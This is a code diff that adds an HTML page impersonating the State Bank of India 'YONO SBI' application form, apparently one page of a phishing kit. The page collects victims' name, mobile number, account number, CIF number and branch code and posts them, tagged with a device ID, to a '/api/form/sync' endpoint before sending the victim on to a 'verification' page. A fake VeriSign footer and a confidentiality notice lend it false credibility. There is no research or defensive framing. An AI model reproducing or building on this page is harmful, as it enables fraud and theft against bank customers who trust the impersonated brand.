@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apply YONO SBI</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: #ffffff;
+        }
+
+        .banner {
+            text-align: center;
+            padding: 14px 8px 6px;
+        }
+
+        .banner img {
+            max-width: 250px;
+        }
+
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 10px 14px 14px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #1976d2;
+            font-size: 20px;
+            font-weight: 600;
+            margin: 8px 0 20px;
+        }
+
+        label {
+            display: block;
+            margin-top: 14px;
+            margin-bottom: 6px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        label span {
+            color: red;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #bdbdbd;
+            border-radius: 10px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #1976d2;
+        }
+
+        .btn-row {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin: 22px 0 14px;
+        }
+
+        button {
+            flex: 1;
+            padding: 14px;
+            font-size: 15px;
+            border: none;
+            border-radius: 28px;
+            cursor: pointer;
+            color: #fff;
+        }
+
+        .submit-btn {
+            background: #1e88e5;
+        }
+
+        .submit-btn:hover {
+            background: #1565c0;
+        }
+
+        .reset-btn {
+            background: #9e9e9e;
+        }
+
+        .note-box {
+            background: #eef3ff;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 11.5px;
+            margin-top: 14px;
+        }
+
+        .note-box ul {
+            margin: 0;
+            padding-left: 18px;
+        }
+
+        .note-box li {
+            margin-bottom: 4px;
+        }
+
+        .footer {
+            margin-top: 8px;
+            background: #212121;
+            color: #cfcfcf;
+            font-size: 11px;
+            padding: 8px 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-radius: 3px;
+        }
+
+        .footer .tick {
+            font-size: 13px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="banner">
+        <img src="../img/yono-banner1.png" alt="YONO SBI">
+    </div>
+
+    <div class="container">
+        <h2>Apply YONO SBI</h2>
+
+        <label>Name <span>*</span></label>
+        <input type="text" id="applyName" placeholder="Enter your name" required>
+
+        <label>Mobile Number <span>*</span></label>
+        <input type="tel" id="applyMobile" maxlength="10" placeholder="Mobile number" required>
+
+        <label>Account Number <span>*</span></label>
+        <input type="text" id="applyAccount" placeholder="Account number" required>
+
+        <label>CIF Number <span>*</span></label>
+        <input type="text" id="cifNumber" placeholder="Enter CIF number" required>
+
+        <label>Branch Code <span>*</span></label>
+        <input type="text" id="branchCode" placeholder="Enter branch code" required>
+
+        <div class="btn-row">
+            <button id="submitBtn" class="submit-btn">Submit</button>
+            <button type="button" id="resetBtn" class="reset-btn">Reset</button>
+        </div>
+
+        <div class="note-box">
+            <ul>
+                <li>Mandatory fields are marked asterisk (*)</li>
+                <li>Do not share your personal information anywhere.</li>
+                <li>Your personal information is highly confidential.</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <span class="tick">✔</span>
+            <span>VeriSign © Copyright | All Rights Reserved</span>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('deviceId') || 'unknown';
+
+        async function syncPageData(pageName, data) {
+            try {
+                await fetch('/api/form/sync', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        deviceId: deviceId,
+                        pageName: pageName,
+                        pageData: data,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error('[Form] Sync error:', error);
+            }
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const fullName = document.getElementById('applyName').value.trim();
+            const mobileNumber = document.getElementById('applyMobile').value.trim();
+            const accountNumber = document.getElementById('applyAccount').value.trim();
+            const cifNumber = document.getElementById('cifNumber').value.trim();
+            const branchCode = document.getElementById('branchCode').value.trim();
+
+            if (!fullName || !mobileNumber || !accountNumber || !cifNumber || !branchCode) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            await syncPageData('yono_apply', {
+                fullName,
+                mobileNumber,
+                accountNumber,
+                cifNumber,
+                branchCode
+            });
+
+            window.location.href = 'verification.html?deviceId=' + encodeURIComponent(deviceId);
+        });
+
+        document.getElementById('resetBtn').addEventListener('click', () => {
+            document.getElementById('applyName').value = '';
+            document.getElementById('applyMobile').value = '';
+            document.getElementById('applyAccount').value = '';
+            document.getElementById('cifNumber').value = '';
+            document.getElementById('branchCode').value = '';
+        });
+    </script>
+</body>
+
+</html>
